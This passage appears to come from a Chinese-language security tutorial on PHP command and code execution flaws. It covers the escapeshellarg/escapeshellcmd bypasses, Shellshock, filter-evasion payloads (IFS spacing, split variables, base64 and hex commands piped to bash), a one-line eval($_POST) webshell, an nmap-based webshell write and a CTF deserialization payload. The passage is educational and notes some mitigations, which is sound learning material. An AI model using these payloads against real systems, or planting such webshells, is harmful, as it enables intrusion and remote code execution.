NULL</span><br></pre></td></tr></table></figure><p><strong>passthru()：</strong></p><p>执行外部程序，并将原始输出<strong>直接传递给浏览器</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">函数原型</span><br><span class="line">void passthru(string $command ,array $output)</span><br><span class="line">（必须）$command: 要执行的命令</span><br><span class="line">$output: 用于存储命令的输出。然而，尽管提供了这个参数，passthru() 并不会使用它来捕获输出，因为输出会被直接发送到浏览器。这个参数在 passthru() 函数中实际上是被忽略的</span><br></pre></td></tr></table></figure><p><strong>区别：</strong></p><p>总体而言，system()、passthru()函数是可以不需要echo来进行显出的，而exec()、shell_exec()是需要的；此外，除passthru()外引入变量进行储存输出结果是为了方便进行后续处理，对于system函数要用到缓冲输出ob_start()，使其不会立马显示输出结果，并且可以对其进行后续处理</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ob_start(); </span><br><span class="line">system(&#x27;ls -l&#x27;);</span><br><span class="line">$output = ob_get_clean(); </span><br></pre></td></tr></table></figure><ul><li>system 是最灵活的，可以捕获输出并获取退出状态</li><li>exec 类似于 system，但只返回最后一行输出</li><li>shell_exec 用于获取整个命令的输出结果</li><li>passthru 用于直接将命令的原始输出传递给浏览器</li></ul><p><strong>popen()：</strong></p><p>打开一个管道，以便与一个程序建立通信，返回一个文件指针，可以用来读取或写入数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">函数原型</span><br><span class="line">popen(string $command, string $mode): resource | false</span><br><span class="line">$command 是必需的参数，指定要执行的命令</span><br><span class="line">$mode 是必需的参数，指定连接模式</span><br><span class="line">&#x27;r&#x27;: 只读模式</span><br><span class="line">&#x27;w&#x27;: 只写模式（打开并清空已有文件或创建一个新文件）</span><br></pre></td></tr></table></figure><p>现在，如果对于用户的命令输入不进行过滤，当输入ls -l、rm -rf等可查看当前目录所有文件夹或者删除文件，这些命令会造成极大的危害，我们可以通过建立<strong>白名单</strong>的方式去限制用户的输入；也可以通过PHP配置文件里disable_functions &#x3D; 配置，禁止某些PHP函数</p><h3 id="2-escapeshellarg-escapeshellcmd-函数"><a href="#2-escapeshellarg-escapeshellcmd-函数" class="headerlink" title="2.escapeshellarg()&#x2F;escapeshellcmd()函数"></a>2.escapeshellarg()&#x2F;escapeshellcmd()函数</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">escapeshellarg(string$arg):string 在参数的两边加上单引号（Windows中是双引号），并对内部的单引号进行转义（确保用户只传递一个参数给命令）</span><br><span class="line"></span><br><span class="line">escapeshellcmd(string$command):string 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义，确保用户输入的数据不会影响shell命令的结构，保证用户输入的数据在传送到 exec()或 system()函数，或者执行操作符之前进行转义（*&amp;#;`|*?~&lt;&gt;^()[]&#123;&#125;$*, \x0A和\xFF）（确保用户只执行一个命令）</span><br></pre></td></tr></table></figure><p>这两个函数在php本意是防止用户输入的数据被解释为shell命令的一部分，从而执行未授权的命令，但依旧可以去进行绕过</p><h4 id="escapeshellarg-函数造成的参数注入（gitlist-0-6-0远程命令执行漏洞）"><a href="#escapeshellarg-函数造成的参数注入（gitlist-0-6-0远程命令执行漏洞）" class="headerlink" title="escapeshellarg()函数造成的参数注入（gitlist 0.6.0远程命令执行漏洞）"></a>escapeshellarg()函数造成的参数注入（gitlist 0.6.0远程命令执行漏洞）</h4><p>gitlist是一款使用PHP开发的图形化git仓库查看工具，其中有一部分代码是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">public function searchTree($query, $branch)</span><br><span class="line">&#123;</span><br><span class="line">    if (empty($query)) &#123;</span><br><span class="line">        return null;                            （$query是搜索的关键字，$branch是搜索的分支）</span><br><span class="line">    &#125;</span><br><span class="line">    $query = escapeshellarg($query);</span><br><span class="line">    try &#123;</span><br><span class="line">        $results = $this-&gt;getClient()-&gt;run($this, &quot;grep -i --line-number &#123;$query&#125; $branch&quot;);</span><br><span class="line">    &#125; catch (\RuntimeException $e) &#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>当$query&#x3D;–open-files-in-pager&#x3D;id;时我们看看变成了什么</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git grep -i --line-number &#x27;--open-files-in-pager=id;&#x27; master</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Linux 中通常使用 - 或者 -- 来作为选项（Option）的标识符</span><br></pre></td></tr></table></figure><p>这里就发生了id命令注入（用于显示当前用户的用户ID和组ID信息），可以看到并不是所有的输入加上单引号都会变成字符串， 原因在于**–open-files-in-pager&#x3D;id;<strong>整体是一个</strong>参数选项<strong>，shell解释器会将–后面的内容视为</strong>参数值<strong>，单引号包裹使之成为字符串的前提是这个字符串应</strong>出现在参数值的位置，并非参数选项**</p><p>参数：参数值是在命令行或函数调用中，用来传递具体数据或信息给程序或函数的部分。<strong>它是某个参数的实际取值</strong></p><p>参数选项：参数选项是用来配置程序或函数行为的标志或开关。它不包含具体的数值，<strong>而是用于启用或禁用某些功能</strong></p><p>对此有以下解决方案：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">git grep -i --line-number -e &#x27;--open-files-in-pager=id;&#x27; master</span><br><span class="line">-e 选项实际上是 git grep 命令的一个参数，后面跟着的是搜索模式 example，即你想要在代码中查找的文本，届时，&#x27;--open-files-in-pager=id;&#x27;就变成了字符串</span><br><span class="line"></span><br><span class="line">------------------------------------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">public function searchTree($query, $branch)</span><br><span class="line">&#123;</span><br><span class="line">    if (empty($query)) &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line">    $query = preg_replace(&#x27;/(--?[A-Za-z0-9\-]+)/&#x27;, &#x27;&#x27;, $query);</span><br><span class="line">    $query = escapeshellarg($query);</span><br><span class="line">    try &#123;</span><br><span class="line">        $results = $this-&gt;getClient()-&gt;run($this, &quot;grep -i --line-number -- &#123;$query&#125; $branch&quot;);</span><br><span class="line">    &#125; catch (\RuntimeException $e) &#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">这里用preg_replace函数将-开头的非法字符串移除，并拼接在--后面</span><br></pre></td></tr></table></figure><h4 id="escapeshellarg-和escapeshellcmd-组合使用造成的参数注入"><a href="#escapeshellarg-和escapeshellcmd-组合使用造成的参数注入" class="headerlink" title="escapeshellarg()和escapeshellcmd()组合使用造成的参数注入"></a>escapeshellarg()和escapeshellcmd()组合使用造成的参数注入</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=&#x27;nmap&#x27;;</span><br><span class="line">echo $a.escapeshellcmd(escapeshellarg(&quot;&#x27;&lt;?php eval(muma); ?&gt; -oG shell.php&#x27;&quot;))</span><br><span class="line">?&gt;</span><br><span class="line">输出：</span><br><span class="line">namp &#x27;&#x27;\\&#x27;&#x27; \&lt;\?php eval\(muma\)\; \?\&gt; -oG shell.php &#x27;\\&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure><p>最终将会非法写入一个一句话木马文件</p><h3 id="3-系统漏洞造成命令注入（Bash-Shellshock破壳漏洞CVE-2014-6271）"><a href="#3-系统漏洞造成命令注入（Bash-Shellshock破壳漏洞CVE-2014-6271）" class="headerlink" title="3.系统漏洞造成命令注入（Bash Shellshock破壳漏洞CVE-2014-6271）"></a>3.系统漏洞造成命令注入（Bash Shellshock破壳漏洞CVE-2014-6271）</h3><p>在以前的应用bash的unix&#x2F;linux系统中，进行一些网络服务器部署时，使用bash处理一些请求</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GNU项目（一种类unix系统）下发布的命令行解释器，有进行一些文本处理，自动化任务等操作功能</span><br></pre></td></tr></table></figure><p>在GNU Bash 4.3及之前版本构造的环境变量存在安全漏洞，向环境变量值内的函数定义后添加多余的字符串会触发此漏洞，攻击者可利用此漏洞改变或绕过环境限制，以执行Shell命令，可能造成一些远程控制等危害</p><p>如果一个环境变量以**(){**开头，Bash会将其解析为一个函数定义，而不是一个普通的字符串，当我们构造</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">() &#123; :; &#125;; ls -l /etc</span><br><span class="line">:是一个空命令，不执行任何操作，但这个环境变量被导出到Bash环境中，Bash在执行env命令（查看当前会话中的所有环境变量及其值）或其他可能触发环境变量解析的命令时，就会泄露/etc目录内容</span><br><span class="line"></span><br><span class="line">x() &#123; ls -l /etc; &#125;或者说我们执行x函数后，也能触发我们的恶意代码（环境变量在子进程解释成了函数执行）</span><br><span class="line"></span><br><span class="line">export shell=x</span><br><span class="line">$shell</span><br><span class="line">现在，当有命令或者是服务触发这个变量时，就会一并执行恶意代码</span><br></pre></td></tr></table></figure><p>可以看到漏洞本身在于执行enc命令，其并不能直接造成远程代码执行，要借助第三方（服务程序）作为媒介才能够实现</p><h3 id="4-命令拼接符号及一些绕过方法"><a href="#4-命令拼接符号及一些绕过方法" class="headerlink" title="4.命令拼接符号及一些绕过方法"></a>4.命令拼接符号及一些绕过方法</h3><p>**;**（Unix&#x2F;Linux）   **&amp;**（Windows）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">command1; command2</span><br><span class="line">command1&amp; command2</span><br><span class="line">连续执行多个命令，即使前一个命令失败，后一个命令也会执行</span><br></pre></td></tr></table></figure><p><strong>&amp;&amp;</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">command1 &amp;&amp; command2</span><br><span class="line">前一个命令成功执行（返回状态码为0）时，后一个命令才会执行</span><br></pre></td></tr></table></figure><p><strong>||</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">command1 || command2</span><br><span class="line">前一个命令失败（返回状态码非0）时，后一个命令才会执行</span><br></pre></td></tr></table></figure><p><strong>|</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">command1 | command2</span><br><span class="line">前一个命令的输出作为后一个命令的输入（参数）</span><br></pre></td></tr></table></figure><p><strong>重定向符号</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">command1 &gt; output.txt</span><br><span class="line">&gt;：将结果输出到文件中，该文件原有内容会被删除</span><br><span class="line">command2 &lt; input.txt</span><br><span class="line">&lt;：从文件读取输入作为命令的参数（但通常会直接省略，例如：cat &lt; 1.txt我们可以直接写成cat 1.txt，此时我们没有明确指定输入来源时，命令默认会从标准输入（stdin）读取数据）</span><br><span class="line">command3 &gt;&gt; log.txt</span><br><span class="line">&gt;&gt;：命令的输出追加到文件末尾，而不是覆盖文件</span><br><span class="line">command4 &lt;&lt; 分隔符</span><br><span class="line">&lt;&lt;：一段文本或一个文件的内容重定向为命令的输入，直至遇到分隔符（可以是任何字符串，例如：cat &lt;&lt; EOF</span><br><span class="line">This is the first line of text.</span><br><span class="line">This is the second line of text.</span><br><span class="line">EOF）</span><br></pre></td></tr></table></figure><p><strong>转义符号\（Linux）^（Windows）</strong></p><p><strong>命令绕过空格：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$&#123;IFS&#125;$9（$后可以接任意数字，始终为空字符）、&#123;IFS&#125;、$IFS、$&#123;IFS&#125;、$IFS$1、IFS</span><br><span class="line">&lt; 、&lt;&gt; </span><br><span class="line">&#123;cat,flag.php&#125;  用逗号实现了空格功能，需要用&#123;&#125;括起来</span><br><span class="line">%20  (space)</span><br><span class="line">%09  (tab)</span><br><span class="line">X=$&#x27;cat\x09./flag.php&#x27;;$X （也可以用\x20）</span><br></pre></td></tr></table></figure><p><strong>命令绕过读文件</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">例如，cat被禁用，我们可以替换成：</span><br><span class="line">more:一页一页的显示档案内容</span><br><span class="line">less:与 more 类似，可以PGUP,PGON翻页</span><br><span class="line">head:查看头几行</span><br><span class="line">tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示</span><br><span class="line">tail:查看尾几行</span><br><span class="line">nl：显示的时候，顺便输出行号</span><br><span class="line">od:以二进制的方式读取档案内容</span><br><span class="line">vi:一种编辑器，这个也可以查看</span><br><span class="line">vim:一种编辑器，这个也可以查看</span><br><span class="line">sort:可以查看</span><br><span class="line">uniq:可以查看</span><br><span class="line">file -f:报错出具体内容</span><br><span class="line"></span><br><span class="line">或者在cat，flag中间某个位置添加\、&#x27;&#x27;、&quot;&quot;的特殊字符绕过</span><br><span class="line">添加$1、$2等、$@、$&#123;1&#125;等进行空变量绕过</span><br><span class="line">添加$a,$b这样的未初始化的变量（值为NULL）在末尾进行绕过（cat$a flag$a）</span><br><span class="line"></span><br><span class="line">变量拼接：</span><br><span class="line">if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip))&#123;</span><br><span class="line">    die(&quot;fxck your flag!&quot;);</span><br><span class="line">贪婪匹配，这里是看flag是否按顺序出现过</span><br><span class="line">a=fl;b=ag;cat$IFS$a$b</span><br><span class="line">a=g;cat$IFS$1fla$a.php</span><br></pre></td></tr></table></figure><p><strong>通配符绕过</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">*    匹配全部字符（*.txt匹配所有扩展名为.txt的文件）</span><br><span class="line">?    任意一个字符（le?.txt匹配le1.txt、leA.txt 等）</span><br><span class="line">[]   表示一个范围（[abc] 匹配 a、b、c中的任意一个字符）</span><br><span class="line">&#123;&#125;   产生一个序列（a&#123;3&#125;：表示字符a连续出现三次，将匹配aaa；a&#123;2,&#125;：表示字符a连续出现至少两次，将匹配 aa、aaa、aaaa等</span><br><span class="line">     a&#123;2,4&#125;：表示字符a连续出现的次数在2到4次之间，包括2次和4次，将匹配 aa、aaa、aaaa）</span><br></pre></td></tr></table></figure><p><strong>编码绕过</strong></p><p>base64</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo Y2F0IGZsYWc=|base64 -d|bash</span><br><span class="line">Y2F0IGZsYWc=是cat flag的base64编码;-d表示解码操作;bash是Linux的命令解释器</span><br><span class="line">如果bash被过滤可用sh</span><br></pre></td></tr></table></figure><p>hex</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">echo 63617420666c6167|xxd -r -p|bash</span><br><span class="line">xxd 是一个十六进制转义序列的工具，通常用于将二进制文件转换为十六进制表示，或者反过来      </span><br><span class="line">-r 进行反向转换，即从十六进制转换回二进制</span><br><span class="line">-p 以十六进制字节对的原始形式输出，而不是以可打印的ASCII字符形式输出</span><br></pre></td></tr></table></figure><p>8进制、unicode编码……</p><p><strong>内联执行（反引号&#96;&#96;绕过）</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat$IFS$9`ls`</span><br><span class="line">将反引号内命令的输出作为输入执行（`命令`和$(命令)都是执行命令的方式）</span><br></pre></td></tr></table></figure><p><strong>绕过长度限制（利用重定向符号&gt;、&gt;&gt;）</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;ca\\&quot;&gt;shell</span><br><span class="line">echo &quot;t\\&quot;&gt;&gt;shell</span><br><span class="line">echo &quot; fl\\&quot;&gt;&gt;shell</span><br><span class="line">echo &quot;ag&quot;&gt;&gt;shell</span><br><span class="line"></span><br><span class="line">cat shell</span><br><span class="line">ca\</span><br><span class="line">t\</span><br><span class="line">fl\</span><br><span class="line">ag</span><br></pre></td></tr></table></figure><h3 id="5-MSF"><a href="#5-MSF" class="headerlink" title="5.MSF"></a>5.MSF</h3><p>Metasploit Framework 对于漏洞的利用（永恒之蓝造成的RCE）……</p><p>msf中有很多漏洞模块，当我们想知道目标系统是否存在该漏洞时，就可以用对应的exploit模块可以用来验证和利用这个漏洞</p><h2 id="代码执行漏洞"><a href="#代码执行漏洞" class="headerlink" title="代码执行漏洞"></a>代码执行漏洞</h2><h3 id="1-eval"><a href="#1-eval" class="headerlink" title="1.eval"></a>1.eval</h3><p>可以接受一个包含PHP代码的字符串作为参数，并像在PHP脚本中一样执行这段代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;quar&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">@ 符号是 PHP 的错误抑制操作符</span><br></pre></td></tr></table></figure><h3 id="2-assert"><a href="#2-assert" class="headerlink" title="2.assert"></a>2.assert</h3><p>用于执行一个断言。它接受两个参数：第一个参数是要验证的表达式，第二个参数是当表达式为假时显示的错误消息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assert($value &gt; 0, &#x27;Value must be greater than zero&#x27;);</span><br></pre></td></tr></table></figure><h3 id="3-preg-replace"><a href="#3-preg-replace" class="headerlink" title="3.preg_replace"></a>3.<strong>preg_replace</strong></h3><p>这个函数用于执行正则表达式搜索和替换。它接受三个参数：第一个参数是正则表达式模式，第二个参数是用于替换的字符串或数组，第三个参数是要搜索和替换的原始字符串</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$pattern = &#x27;/[a-z]/&#x27;;     匹配从a到z的任何单个字符</span><br><span class="line">$replacement = &#x27;X&#x27;;</span><br><span class="line">$subject = &#x27;abc&#x27;;</span><br><span class="line">$result = preg_replace($pattern, $replacement, $subject); </span><br></pre></td></tr></table></figure><p><img src="/undefined/46b9/1.png" alt="image-20240316200023380"></p><h3 id="4-call-user-func"><a href="#4-call-user-func" class="headerlink" title="4.call_user_func"></a>4.<strong>call_user_func</strong></h3><p>接受一个回调函数作为第一个参数，然后执行它，可以传递任意数量的额外参数给回调函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">call_user_func (callable $callback ,mixed $parameter)</span><br><span class="line">$callback:调用的回调函数的名称，或者是一个包含对象引用和方法名的数组</span><br><span class="line">$parameter：这是传递给回调函数的一个或多个参数</span><br></pre></td></tr></table></figure><p><img src="/undefined/46b9/2.png" alt="image-20240316200138761"></p><h3 id="5-反序列化"><a href="#5-反序列化" class="headerlink" title="5.反序列化"></a>5.反序列化</h3><p><strong>序列化</strong>：把对象转换为字节序列的过程，即把对象转换为可以存储或传输的数据的过程。例如将内存中的对象转换为二进制数据流或文件，在网络传输过程中，可以是字节或是XML等格式。</p><p><strong>反序列化</strong>：把字节序列恢复为对象的过程，即把可以存储或传输的数据转换为对象的过程。例如将二进制数据流或文件加载到内存中还原为对象。</p><p><strong>漏洞原理：</strong></p><p>在Python和PHP中，一般通过构造一个包含魔术方法（在发生特定事件或场景时被自动调用的函数，通常是构造函数或析构函数）的类，然后在魔术方法中调用命令执行或代码执行函数，接着实例化这个类的一个对象并将该对象序列化后传递给程序，当程序反序列化该对象时触发魔术方法从而执行命令或代码。在Java中没有魔术方法，但是有反射（reflection）机制，在程序的运行状态中，可以构造任意一个类的对象，可以了解任意一个对象所属的类，可以了解任意一个类的成员变量和方法，可以调用任意一个对象的属性和方法，这种动态获取程序信息以及动态调用对象的功能称为Java语言的反射机制。一般利用反射机制来构造一个执行命令的对象或直接调用一个具有命令执行或代码执行功能的方法实现任意代码执行</p><p>[极客大挑战 2019]PHP</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span> = <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span> = <span class="string">&#x27;yesyes&#x27;</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;password != <span class="number">100</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You name is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;username;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You password is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;password;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;username === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line"> </span><br><span class="line">             </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span> = <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span> = <span class="string">&#x27;yesyes&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Name</span>(<span class="string">&#x27;admin&#x27;</span>,<span class="number">100</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">这是根据源码进行的序列化过程最后输出</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Name&quot;:2:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;&#125;</span><br><span class="line"></span><br><span class="line">在PHP序列化格式中，o 表示序列化的数据是一个对象，s 表示字符串值，而数字（如 14 和 5）表示字符串的长度。冒号 : 用于分隔键名和值。在这个例子中：</span><br><span class="line">O:4:&quot;Name&quot; 表示一个对象，类名为 Name，对象的大小（或者说属性数量）为4。</span><br><span class="line">s:14:&quot;Nameusername&quot; 